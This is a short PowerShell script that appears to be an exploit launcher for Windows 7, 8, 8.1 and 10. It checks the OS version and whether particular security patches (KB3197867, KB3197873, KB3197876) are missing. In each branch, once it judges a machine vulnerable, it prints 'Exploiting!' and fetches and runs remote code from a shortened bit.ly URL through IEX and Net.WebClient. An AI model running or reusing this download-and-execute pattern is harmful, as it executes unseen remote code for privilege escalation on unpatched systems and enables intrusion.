
# Windows 7 SP1 / Windows Server 2008 R2 SP1 - KB3197867 
# Windows 8.1 / Windows Server 2012 R2 - KB3197873
# Windows Server 2012 - KB3197876 
# Windows 10 - Pre Anniversary Edition Build 14393

$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"

switch ($OSMajorMinor)
{
	'10.0' # Win10 / 2k16
	{
		echo "[?] Target is Win 10"	
		echo "[+] Checking for Pre-Anniversary Edition Build"
		if((!([System.IntPtr]::Size -ne 8)) -And ($OSVersion.Build -lt 14393)){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.3' # Win8.1 / 2k12R2
	{
		echo "[?] Target is Win 8.1"
		echo "[+] Checking if x64 and for KB3197873 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197873))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.2' # Win8 / 2k12
	{
		echo "[?] Target is Win 8"
		echo "[+] Checking x64 and for KB3197876 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197876))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.1' # Win7 / 2k8R2
	{
		echo "[?] Target is Win 7"
		echo "[+] Checking x64 and for KB3197867 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197867))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}
}
